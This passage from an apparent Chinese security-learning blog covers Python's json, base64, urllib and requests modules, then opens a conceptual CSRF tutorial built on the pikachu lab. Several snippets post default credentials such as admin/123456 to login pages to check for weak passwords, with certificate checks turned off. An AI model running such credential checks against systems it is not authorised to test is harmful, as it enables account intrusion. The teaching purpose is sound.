class="line">这就要从他的特点来说了,也是他的用途 :</span><br><span class="line"></span><br><span class="line">1.用于存储==&gt;用于存档</span><br><span class="line">    大家玩过存档游戏吗?存档对于玩家说是装备等级,对程序员来说实际上这些就是数据,代码而已,</span><br><span class="line">    所以所谓的存档就是把程序的运行状态保存下来了(内存中的数据)</span><br><span class="line">    </span><br><span class="line">2.传输给其他平台使用==&gt;跨平台数据交互</span><br><span class="line">     python                    java</span><br><span class="line">    列表       特定格式      数组</span><br><span class="line">    </span><br><span class="line">强调:</span><br><span class="line">        针对用途1 可以是一种专用的格式==&gt;pickle</span><br><span class="line">        针对用途2 应该是通用, 能够被所有语言识别的格式==&gt;json</span><br></pre></td></tr></table></figure><p>json模块示例代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">dic = &#123;<span class="string">&quot;status&quot;</span>: <span class="number">200</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;success&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化</span></span><br><span class="line">res = json.dumps(dic)</span><br><span class="line"><span class="built_in">print</span>(res, <span class="built_in">type</span>(res))  <span class="comment"># &#123;&quot;status&quot;: 200, &quot;msg&quot;: &quot;success&quot;&#125; &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反序列化</span></span><br><span class="line">l = json.loads(res)</span><br><span class="line"><span class="built_in">print</span>(l, <span class="built_in">type</span>(l))  <span class="comment"># &#123;&#x27;status&#x27;: 200, &#x27;msg&#x27;: &#x27;success&#x27;&#125; &lt;class &#x27;dict&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 补充:</span></span><br><span class="line"><span class="comment"># 将序列化的结果写入文件</span></span><br><span class="line">res = json.dumps(dic)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.json&#x27;</span>, mode=<span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json.dump(dic, f)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># # 将文件读取的json格式的字符串反序列化出来</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.json&#x27;</span>, mode=<span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    res = json.load(f)</span><br><span class="line"><span class="built_in">print</span>(res, <span class="built_in">type</span>(res))    <span class="comment"># &#123;&quot;status&quot;: 200, &quot;msg&quot;: &quot;success&quot;&#125; &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># json验证: json格式兼容的是所有语言通用的数据类型 ,不能支持单一语言所有类型</span></span><br><span class="line"><span class="comment">#                不支持python的集合和元祖</span></span><br></pre></td></tr></table></figure><p>我们用到的场景是 , 当后面我们使用python代码发送网络请求 , 得到服务器的响应是json格式的字符串的时候 , 可以通过反序列化 , 把字符串转成字典对象, 然后通过字典的方法 , 获取其中我们想要的数据</p><h2 id="5、base64模块"><a href="#5、base64模块" class="headerlink" title="5、base64模块"></a>5、base64模块</h2><p>实现对字符串的base64编码和解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># base64编码</span></span><br><span class="line">s1 = <span class="string">&quot;admin&quot;</span></span><br><span class="line">res1 = base64.b64encode(s1.encode(<span class="string">&quot;utf-8&quot;</span>))  <span class="comment"># 参数必须是字节,返回值是字节</span></span><br><span class="line"><span class="built_in">print</span>(res1)  <span class="comment"># b&#x27;YWRtaW4=&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(res1.decode(<span class="string">&quot;utf-8&quot;</span>)) <span class="comment"># YWRtaW4=</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单封装成一个函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_b64encode</span>(<span class="params">s</span>):</span><br><span class="line">    res = base64.b64encode(s.encode(<span class="string">&quot;utf-8&quot;</span>))  <span class="comment"># 参数必须是字节,返回值是字节</span></span><br><span class="line">    <span class="keyword">return</span> res.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b64 = my_b64encode(<span class="string">&quot;123456&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(b64)</span><br><span class="line"></span><br><span class="line"><span class="comment"># base64解码</span></span><br><span class="line">b64_str = <span class="string">&quot;YWRtaW4=&quot;</span></span><br><span class="line">res = base64.b64decode(b64_str)</span><br><span class="line">res = res.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(res) <span class="comment"># admin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 封装成一个函数</span></span><br></pre></td></tr></table></figure><h2 id="6、url模块"><a href="#6、url模块" class="headerlink" title="6、url模块"></a>6、url模块</h2><p>通过python对url进行编码和解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="comment"># url编码</span></span><br><span class="line">keyword = <span class="string">&quot;后台&quot;</span></span><br><span class="line">keyword_byte = keyword.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">url_keyword = urllib.parse.quote(keyword_byte)</span><br><span class="line"><span class="built_in">print</span>(url_keyword)  <span class="comment"># %E5%90%8E%E5%8F%B0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># url解码</span></span><br><span class="line">url_keyword = <span class="string">&quot;%E5%90%8E%E5%8F%B0&quot;</span></span><br><span class="line">url = urllib.parse.unquote(url_keyword)</span><br><span class="line"><span class="built_in">print</span>(url)  <span class="comment"># 后台</span></span><br></pre></td></tr></table></figure><h1 id="三、requests初体验"><a href="#三、requests初体验" class="headerlink" title="三、requests初体验"></a>三、requests初体验</h1><h2 id="1、requests是什么"><a href="#1、requests是什么" class="headerlink" title="1、requests是什么"></a>1、requests是什么</h2><p>requests 是一个在python中用来发送请求的模块 , 同时他是一个第三方模块 , 我们可以通过pip3安装 </p><p>我们平时使用浏览器上网本质上是不是就是通过浏览器这个工具对对方的网站发送请求 , 那么我换个工具 , 不再使用浏览器 , 使用其他的我不管你是什么工具 , 只要能满足我们发送请求的需求即可 , requests这个模块就是发送请求的一个模块。<br>##2、安装<br>pip3 install requests<br>这种是在线安装 , 还有一种本地安装的方式 , 需要先下载对应的模块安装包 , 一般用到的比较少 , 可能python2环境下的一些依赖无法在线自动安装会采用这种方式安装<br><a href="https://pypi.org/project/requests/#files">https://pypi.org/project/requests/#files</a><br><img src="http://120.48.107.243:9090/blog/2023/04/03/8f4fa33a830d4f30adc92e2a8dcbb3b4.png" alt="在这里插入图片描述"><br>pip3 install requests-2.28.0-py3-none-any.whl</p><h1 id="四、requests基本使用"><a href="#四、requests基本使用" class="headerlink" title="四、requests基本使用"></a>四、requests基本使用</h1><h2 id="1、发送get请求"><a href="#1、发送get请求" class="headerlink" title="1、发送get请求"></a>1、发送get请求</h2><p>环境<br><a href="http://www.baidu.com/">http://www.baidu.com</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.打印服务器返回的响应状态码</span></span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br><span class="line"><span class="comment"># 2.打印服务器返回的响应内容 , 全部</span></span><br><span class="line"><span class="comment"># print(response.text)</span></span><br><span class="line"><span class="comment"># # 3.保存到一个html文件</span></span><br><span class="line"><span class="comment"># with open(&quot;./1.html&quot;,mode=&quot;w&quot;,encoding=&quot;utf-8&quot;) as f:</span></span><br><span class="line"><span class="comment">#     f.write(response.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.返回编码格式</span></span><br><span class="line"><span class="built_in">print</span>(response.encoding)  <span class="comment"># ISO-8859-1</span></span><br><span class="line"><span class="comment">#  response.text 之时，Requests 会使用其推测的文本编码。你可以找出 Requests 使用了什么编码，并且能够使用 r.encoding 属性来改变它：</span></span><br><span class="line"><span class="comment">#  如果你改变了编码，每当你访问 response.text ，Request 都将会使用 r.encoding 的新值</span></span><br><span class="line"><span class="comment"># 5.设置编码格式</span></span><br><span class="line">response.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line"><span class="comment"># 6.设置编码后再保存到一个html文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./2.html&quot;</span>,mode=<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(response.text)</span><br></pre></td></tr></table></figure><h2 id="2、发送post请求"><a href="#2、发送post请求" class="headerlink" title="2、发送post请求"></a>2、发送post请求</h2><p>环境：<br><a href="http://xx.xx.xx.xxx:8092/toLogin">http://XX.XX.XX.XXX:8092/toLogin</a><br>通过浏览器查看post请求提交的数据<br><img src="http://120.48.107.243:9090/blog/2023/04/03/0dcc65997d3d4dcf88c1a9935c904dad.png" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;http://XX.XX.XX.XXX:8092/login&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;userName&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line">d = json.loads(response.text)</span><br><span class="line"><span class="keyword">if</span> d.get(<span class="string">&quot;code&quot;</span>) == <span class="number">200</span> <span class="keyword">and</span> d.get(<span class="string">&quot;msg&quot;</span>) == <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+]<span class="subst">&#123;url&#125;</span>存在弱口令&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[-]<span class="subst">&#123;url&#125;</span>不存在弱口令&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="3、参数解释"><a href="#3、参数解释" class="headerlink" title="3、参数解释"></a>3、参数解释</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 请求方法</span></span><br><span class="line">requests.方法名()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常见参数</span></span><br><span class="line">url                          <span class="comment"># 请求的url</span></span><br><span class="line">data                       <span class="comment"># post请求携带的请求体</span></span><br><span class="line"></span><br><span class="line">headers                  <span class="comment"># 请求头</span></span><br><span class="line">cookies                  <span class="comment"># cookies</span></span><br><span class="line">timeout       <span class="comment"># 等待时间</span></span><br><span class="line">allow_redirects      <span class="comment"># 是否运行重定向 , 默认是允许 true</span></span><br><span class="line">proxies                   <span class="comment"># 代理 , 参数是字典类型 , 示例 : </span></span><br><span class="line">proxies = &#123; <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:7890&quot;</span>, <span class="string">&quot;https&quot;</span>: <span class="string">&quot;http://10.10.1.10:1080&quot;</span>, &#125;</span><br><span class="line">协议  url</span><br><span class="line">verify                      <span class="comment"># ssl证书校验 , 默认是true</span></span><br></pre></td></tr></table></figure><h2 id="4、响应获取"><a href="#4、响应获取" class="headerlink" title="4、响应获取"></a>4、响应获取</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.获取响应状态码</span></span><br><span class="line">response.status_code    <span class="comment"># int</span></span><br><span class="line"><span class="comment"># 2.获取响应头</span></span><br><span class="line">response.headers         <span class="comment"># dict</span></span><br><span class="line"><span class="comment"># 3.获取响应体</span></span><br><span class="line"><span class="comment"># 3.1 文本内容</span></span><br><span class="line">response.text              <span class="comment"># str</span></span><br><span class="line"><span class="comment"># 3.2 字节内容 (图片,音频,视频)</span></span><br><span class="line">response.content        <span class="comment"># byte</span></span><br><span class="line"><span class="comment"># 3.3 json格式字符串</span></span><br><span class="line">response.json()           <span class="comment"># str</span></span><br></pre></td></tr></table></figure><h2 id="5、bp插件"><a href="#5、bp插件" class="headerlink" title="5、bp插件"></a>5、bp插件</h2><p>在bp的扩展插件中搜索  Copy As Python-Requests</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/c258a5c1a0f24633a79d1519da939810.png" alt="在这里插入图片描述"><br>我们都知道BP可以抓包，当我们相对某个请求包，使用python编写相应代码发送时可以，先使用BP抓包，然后右键选择：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/5b4771a805ed49738f321813f03953ec.png" alt="在这里插入图片描述"><br>此时该插件就会生成python对应的请求代码，并赋值到你当前的剪切板</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">&quot;https://www.baidu.com:443/&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;PSTM&quot;</span>: <span class="string">&quot;1655964694&quot;</span>, <span class="string">&quot;BAIDUID&quot;</span>: <span class="string">&quot;65B9408A169710530C1F05C8AEDD650B:FG=1&quot;</span>, <span class="string">&quot;BD_HOME&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;H_PS_PSSID&quot;</span>: <span class="string">&quot;36552_36460_36673_36455_34813_36165_36570_36073_26350_36469_36314&quot;</span>, <span class="string">&quot;BAIDUID_BFESS&quot;</span>: <span class="string">&quot;65B9408A169710533F70359FCA98D582:FG=1&quot;</span>, <span class="string">&quot;BIDUPSID&quot;</span>: <span class="string">&quot;725DA321C78DF0F6CD65584E4FE8839C&quot;</span>, <span class="string">&quot;BD_UPN&quot;</span>: <span class="string">&quot;12314753&quot;</span>, <span class="string">&quot;BA_HECTOR&quot;</span>: <span class="string">&quot;a90480048h050lah8g1hb810m14&quot;</span>, <span class="string">&quot;ZFY&quot;</span>: <span class="string">&quot;8bxEX:A:B9HSmxIFaHW7pmuR9joCr8iyaLT:B0pkYG6GYM:C&quot;</span>&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Sec-Ch-Ua&quot;</span>: <span class="string">&quot;\&quot;(Not(A:Brand\&quot;;v=\&quot;8\&quot;, \&quot;Chromium\&quot;;v=\&quot;100\&quot;&quot;</span>, <span class="string">&quot;Sec-Ch-Ua-Mobile&quot;</span>: <span class="string">&quot;?0&quot;</span>, <span class="string">&quot;Sec-Ch-Ua-Platform&quot;</span>: <span class="string">&quot;\&quot;Windows\&quot;&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;none&quot;</span>, <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;navigate&quot;</span>, <span class="string">&quot;Sec-Fetch-User&quot;</span>: <span class="string">&quot;?1&quot;</span>, <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;document&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)</span><br></pre></td></tr></table></figure><h1 id="五、尝试看源码分析"><a href="#五、尝试看源码分析" class="headerlink" title="五、尝试看源码分析"></a>五、尝试看源码分析</h1><p>一步一步点击去看就ok了 , 这个时候你就会发现为什么 url 是位置传参 , 而其他的参数是关键字传参了。<br>#六、小模版<br>针对bp生成的代码模板实际上是有一些不足的 , 比如有的站点 ssl证书过期了 , 你直接用浏览器访问都需要我们二次确认 , 对于requests模块也是 , 它也会检测 , 默认 verify 参数是true , 所以需要我们手动设置为 false , 不检测还有一些其他的参数也是 , 比如超时参数 , 最好也设置一下 , 你会发现每次都要设置这些参数 , 所以我们可以保留一个模板 , 防止自己忘记 , 而且我们都知道  请求有可能会失败 , 在我们代码中的体现是请求失败后 , 拿到的响应是None , 如果你再对响应做处理 , 比如 <code>r.text</code> 就会报错 , 所以最好加上 <code>try ... except</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 可能会出错的代码</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="comment"># 报错之后,会执行的代码</span></span><br></pre></td></tr></table></figure><p>报错捕捉需要指定报错类型 , 指定了类型只会捕捉这类的报错 , 比如 IndentationError , SyntaxError等 , 如果你不确定报错的类型 , 那么可以使用 Exception , 它可以捕捉任意类型的报错 , 示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 可能会出错的代码</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://xxxx.com/signin&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;NG_TRANSLATE_LANG_KEY&quot;</span>: <span class="string">&quot;zh-CN&quot;</span>, <span class="string">&quot;JSESSIONID&quot;</span>: <span class="string">&quot;7D7571D40E4C16EC46C0C84FB3340E80&quot;</span>&#125;</span><br><span class="line">headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://xxxx.com&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">           <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://xxxx.com/signin&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,ja;q=0.8&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;apollo&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;login-submit&quot;</span>: <span class="string">&quot;\xe7\x99\xbb\xe5\xbd\x95&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.post(url, headers=headers, cookies=cookies,data=data, allow_redirects=<span class="literal">False</span>, verify=<span class="literal">False</span>, timeout=<span class="number">5</span> )</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="comment"># 退出代码,如果是循环,就跳过本次</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">其他的代码逻辑,比如响应中的数据提取等</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>然后我只需要每次把BP插件生成的代码替换到里面即可 , 或者你可以自己手动编写一个BP插件 , 按照你想要的格式生成python代码</p>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF漏洞的学习</title>
      <link href="/2022/07/20/csrf_study/"/>
      <url>/2022/07/20/csrf_study/</url>
      
        <content type="html"><![CDATA[<h1 id="一、描述"><a href="#一、描述" class="headerlink" title="一、描述"></a>一、描述</h1><p>CSRF定义：跨站请求伪造，也被成为one-click attack或者session riding，通常缩写为CSRF，是一种挟制用户在当前已登录的web应用程序上执行非本意的操作的攻击方法。<br>简单的说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，却不能保证请求本身是用户自愿发出的。<br>CSRF漏洞的成因就是网站的cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，都会默认你已经登录的状态，而在这个期间，攻击者发送了构造好的csrf脚本或包含csrf脚本的链接，可能会执行一些用户不想做的功能（比如添加账号等）。这个操作不是用户真正想要执行的。<br>#二、攻击原理<br>##1、简介<br>用户打开浏览器，访问登录受信任的A网站，在用户信息通过验证后，服务器会返回一个cookie给浏览器，用户登录网站A成功，可以正常发送请求到网站A用户未退出网站A，在同一浏览器中，打开一个危险网站B网站B收到用户请求后，返回一些恶意代码，并发出请求要求访问网站A，浏览器收到这些恶意代码以后，在用户不知情的情况下，利用cookie信息，向网站A发送恶意请求，网站A会根据cookie信息以用户的权限去处理该请求，导致来自网站B的恶意代码被执行。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/d79afe01781e4dcfa08ebd4f2c6d0741.png" alt="在这里插入图片描述"><br>简单点说就是攻击者盗用了你的身份信息，以你的名义发送恶意请求，对服务器来说这个请求是你发起的，缺完成了攻击者所期望的一个操作。</p><h2 id="2、举个场景"><a href="#2、举个场景" class="headerlink" title="2、举个场景"></a>2、举个场景</h2><p>小黑想要修改大白在购物网站<a href="http://www.xx.com上填写的会员地址。![在这里插入图片描述](http://120.48.107.243:9090/blog/2023/04/01/4483c4c8785f4dc2a8fdb2e6417b84d1.png)">www.xx.com上填写的会员地址。![在这里插入图片描述](http://120.48.107.243:9090/blog/2023/04/01/4483c4c8785f4dc2a8fdb2e6417b84d1.png)</a><br>但是大白又不会把自己xx网站的账号密码告诉小黑，所以小黑自己去<a href="http://www.xx.com上注册了一个账号，然后修改一下自己的个人信息，可以发现修改的请求是：">www.xx.com上注册了一个账号，然后修改一下自己的个人信息，可以发现修改的请求是：</a><br><img src="http://120.48.107.243:9090/blog/2023/04/01/2652d83e74744dd7b8a418006a598d54.png" alt="在这里插入图片描述"><br>于是，他实施了这样一个操作，把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了，小黑就完成了攻击目的。</p><h2 id="3、成功关键点"><a href="#3、成功关键点" class="headerlink" title="3、成功关键点"></a>3、成功关键点</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/01/d3b96a850733424eb504d4c03f166542.png" alt="在这里插入图片描述"><br>#三、漏洞危害<br>修改用户信息，修改密码，以你的名义发送邮件、发信息、盗取你的账号等。<br>#四、攻击条件<br>1、用户已登录存在CSRF漏洞的网站<br>2、用户需要被诱导打开攻击者构造的恶意网站。<br>#五、CSRF与XSS的区别<br>##1、XSS<br>攻击者发现XSS漏洞→构造代码→发送给受害人→受害人打开→攻击者获取受害人的cookie→完成攻击<br>##2、CSRF<br>攻击者发现CSRF漏洞→构造代码→发送给受害人→受害人打开→受害人执行代码→完成攻击<br>##3、注意<br>CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。<br>#六、漏洞检测<br>抓取正常请求的数据包，如果不存在token验证，去掉请求头中Referer字段再重新提交，如果服务器返回正常页面，基本可以确定存在CSRF漏洞。<br>#七、CSRF（get）<br>这里使用pikachu靶场<br>进来首先要登录，不知道账号密码点一下提示，点击修改个人信息，抓包，得到请求包信息，参数通过get方式传输。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/8f9a02a912ba4c82afbf903c342e1de4.png" alt="在这里插入图片描述"></p><h1 id="八、CSRF（post）"><a href="#八、CSRF（post）" class="headerlink" 